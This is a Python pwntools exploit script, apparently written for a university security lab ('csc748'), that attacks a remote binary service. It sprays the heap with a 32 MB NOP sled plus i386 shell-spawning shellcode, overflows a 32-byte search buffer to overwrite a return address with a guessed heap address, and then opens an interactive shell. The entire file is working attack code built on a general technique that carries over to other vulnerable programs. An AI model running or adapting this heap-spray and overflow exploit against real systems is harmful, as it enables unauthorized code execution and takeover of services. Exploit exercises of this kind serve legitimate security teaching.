from pwn import *

context.binary = './5-3_lab.bin'

''' Constant Initializing '''
SHELLCODE = asm(shellcraft.i386.linux.sh())    # Generate Shellcode

#SLED_LENGTH = 268435456
#SLED_LENGTH = 134217728
#SLED_LENGTH = 908
SLED_LENGTH = 33554432 #32 megabytes.
RET_GUESS = 0xf6000000



''' Establish Connection '''
# Test Script Against Server
p = remote("csc748.hostbin.org", 7053)        

"""
# Debug with GDB
p = process("./5-3_lab.bin")
gdb.attach(p)  # Attach GDB to the running process
pause()
"""

''' Fill the Heap '''
#	allocate large amount of memory on the heap.
#	
#	fill this allocated memory with NOP sled which act as a series 
#	of placeholders that the program's execution can slide along
#	
#	After the NOP sled, place actual payload (shellcode)

nop_sled = asm(shellcraft.nop() * SLED_LENGTH)
nop_payload = nop_sled + SHELLCODE		# Craft payload by combining NOP sled and shellcode
payload_size = len(nop_payload)


#
# Program Input
#
data_in = p.readuntil(b'exit\n')
print("\n", data_in.decode('utf-8'), "\n")
data_in = p.readuntil(b'Choice:')
print(f"[*] Selecting Option (1): Load Data\n")
p.sendline(b"1")						# Select Option (1): Load Data


data_in = p.readuntil(b'Length:')
print(f"[*] Sending Payload Size: {payload_size}\n")
p.sendline(str(payload_size).encode())	# Enter Length

#p.sendline(bytes([SLED_LENGTH]))  # Enter Length as bytes

data_in = p.readuntil(b'Data:')
print(f"[*] Sending NOP Payload\n")
p.sendline(nop_payload)         			# Enter Data: Send the Payload



''' Redirect Control '''

#	overwrite return address or function pointer to point somewhere 
#	within the NOP sled
#	
#	it will then start sliding down the NOP sled until it reaches 
#	the payload
#	
#	The payload gets executed and spawns a shell

# Trigger the vulnerability to overwrite the heap memory

data_in = p.readuntil(b'exit\n')
data_in = p.readuntil(b'Choice:')

print(f"[*] Selecting Option (2): Search Data\n")
p.sendline(b"2")    # Select Option (2): Search Data


data_in = p.readuntil(b'term:')
print(f"[*] Sending Redirect Payload\n")
payload = b"A"*32 + p32(RET_GUESS)
p.sendline(payload) #overwrite buffer
# place new address



#p.sendline(b"3")    # Select Option (3): Exit



''' Exploit Program '''


p.interactive()
